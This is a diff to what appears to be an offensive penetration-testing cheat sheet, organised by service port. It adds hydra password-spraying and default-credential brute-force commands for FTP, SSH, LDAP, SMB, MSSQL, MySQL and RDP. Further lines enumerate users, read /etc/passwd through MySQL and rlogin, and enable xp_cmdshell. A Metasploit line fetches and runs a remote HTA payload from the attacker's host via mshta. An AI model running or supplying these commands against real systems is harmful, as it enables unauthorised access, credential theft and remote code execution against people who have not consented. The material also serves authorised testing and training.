@@ -389,11 +389,17 @@ for host in $(cat hosts); do
 ; done
 
 [*] (21) FTP
++---------- Spray Service ----------+
+hydra -I ftp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+
++---------- List Files ----------+
+nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
+
++---------- Download Locally ----------+
 wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp
 curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt
 
-nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
-
++---------- Manual Login ----------+
 ftp '$USERNAME'@"$TARGET"
 anonymous
 ls -a
@@ -402,6 +408,9 @@ ascii
 get file.txt -
 
 [*] (22) SSH
++---------- Spray Service ----------+
+hydra -I ssh://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+
 +---------- Key Types ----------+
 ssh -Q key
 ssh-ed25519
@@ -569,6 +578,9 @@ sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
 snmpwalk -v2c -c COMMUNITY $TARGET | grep 'STRING:'
 
 [*] (389) LDAP
++---------- Spray Service ----------+
+hydra -I ldap2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+
 +---------- Domain Information ----------+
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
 
@@ -601,8 +613,11 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'
 
 [*] (445) SMB
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; sort -u usernames | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
+
+hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; sort -u usernames | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --groups | grep 'membercount' | cut -d':' -f1 | sed 's/^[^ ]* *[^ ]* *[^ ]* *[^ ]* *//' | sed 's/ *membercount.*//' >> groups
 
 NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d' | tee smbfiles_$USERNAME
@@ -630,10 +645,15 @@ rlogin -l $USERNAME $TARGET
 rlogin -l $USERNAME $TARGET cat /etc/passwd
 
 [*] (1433) MSSQL
++---------- Spray Service ----------+
+hydra -I mssql://$host -L usernames -P passwords -e n -t15 2>/dev/null
+
++---------- Bruteforce Using Defaults ----------+
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
-for host in $(cat hosts); do (hydra -I mssql://$host -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null | grep -vE 'Hydra|DATA|completed' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &); done
+hydra -I mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null
 
++---------- Executing Queries ----------+
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT name FROM sys.databases;"
 
 DB_NAME="staging"
@@ -646,9 +666,11 @@ sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT @@VERSION AS version, HOST_NAME() AS hostname, SYSTEM_USER AS sys_user;"
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami /all';"
 
++---------- Impacket ----------+
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 
++---------- Metasploit ----------+
 msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
 sessions -i 1
 
@@ -670,6 +692,15 @@ sudo su mntuser
 setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 
 [*] (3306) MySQL
++---------- Spray Service ----------+
+hydra -I mysql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+
++---------- Bruteforce Using Defaults ----------+
+cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mysqlusernames
+cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mysqlpasswords
+hydra -I mysql://$TARGET -L /tmp/mysqlusernames -P /tmp/mysqlpasswords -e n -t15 2>/dev/null
+
++---------- Executing Queries ----------+
 mysql -h localhost -u root --skip-ssl -p'$PASSWORD' -e 'show databases;'
 mysql -h "$TARGET" -u root --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'user'
 mysql -h "$TARGET" -u root --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'account'
@@ -681,6 +712,10 @@ mysql -h "$TARGET" -u root --skip-ssl -p'$PASSWORD' -e "SELECT @@version, @@host
 mysql -h "$TARGET" -u root --skip-ssl -p'$PASSWORD' -e "SELECT LOAD_FILE('/etc/passwd')\G;"
 
 [*] (3389) RDP
++---------- Spray Service ----------+
+hydra -I rdp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+
++---------- Login to Service ----------+
 xfreerdp3 /v:'$TARGET' /d:'$DOM' -sec-nla /tls:seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"
 xfreerdp3 /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /d:'$DOM' -sec-nla /tls:seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"
 
